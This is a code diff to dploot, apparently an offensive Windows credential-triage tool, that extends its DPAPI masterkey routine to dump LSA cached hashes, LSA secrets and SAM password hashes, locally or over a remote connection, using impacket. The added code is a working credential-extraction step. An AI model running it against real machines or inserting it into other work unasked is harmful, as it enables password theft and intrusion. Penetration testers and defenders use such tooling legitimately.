@@ -5,7 +5,7 @@ import os
 from typing import Dict, List
 from Cryptodome.Hash import SHA1
 
-from impacket.examples.secretsdump import LSASecrets
+from impacket.examples.secretsdump import LSASecrets, SAMHashes
 
 from dploot.lib.dpapi import decrypt_masterkey
 from dploot.lib.target import Target
@@ -67,13 +67,37 @@ class MasterkeysTriage:
             if self.conn.bootkey:
                 logging.debug(f"Got Bootkey: {hexlify(self.conn.bootkey)}")
 
-                SECURITYFileName = \
-                    os.path.join(self.target.local_root, r'Windows/System32/config/SECURITY') if self.conn.local_session \
-                    else self.conn.remote_ops.saveSECURITY()
-                LSA = LSASecrets(SECURITYFileName, self.conn.bootkey, self.conn.remote_ops, isRemote=(not bool(self.conn.local_session)),
-                                perSecretCallback=self.getDPAPI_SYSTEM)
-                LSA.dumpSecrets()
-                LSA.finish()
+                try:
+                    SECURITYFileName = \
+                        os.path.join(self.target.local_root, r'Windows/System32/config/SECURITY') if self.conn.local_session \
+                        else self.conn.remote_ops.saveSECURITY()
+                    # retrieve DPAPI keys
+                    LSA = LSASecrets(SECURITYFileName, self.conn.bootkey, self.conn.remote_ops, isRemote=(not bool(self.conn.local_session)),
+                                    perSecretCallback=self.getDPAPI_SYSTEM)
+                    LSA.dumpSecrets()
+                    LSA.finish()
+                    # dump secrets
+                    LSA = LSASecrets(SECURITYFileName, self.conn.bootkey, self.conn.remote_ops, isRemote=(not bool(self.conn.local_session)))
+                    print("LSA Cached Hashes:")
+                    LSA.dumpCachedHashes()
+                    print("LSA Secrets:")
+                    LSA.dumpSecrets()
+                    LSA.finish()
+                except Exception as e:
+                    logging.error('LSA hashes extraction failed: %s' % str(e))
+
+                # dump SAM
+                try:
+                    SAMFileName = \
+                        os.path.join(self.target.local_root, r'Windows/System32/config/SAM') if self.conn.local_session \
+                        else self.conn.remote_ops.saveSAM()
+                    SAM = SAMHashes(SAMFileName, self.conn.bootkey, isRemote = (not bool(self.conn.local_session)))
+                    print("SAM Secrets:")
+                    SAM.dump()
+                    SAM.finish()
+                except Exception as e:
+                    logging.error('SAM hashes extraction failed: %s' % str(e))
+
         system_protect_dir = self.conn.remote_list_dir(self.share, path=self.system_masterkeys_generic_path)
         for d in system_protect_dir:
             if d not in self.false_positive and d.is_directory()>0 and d.get_longname()[:2] == 'S-':# could be a better way to deal with sid
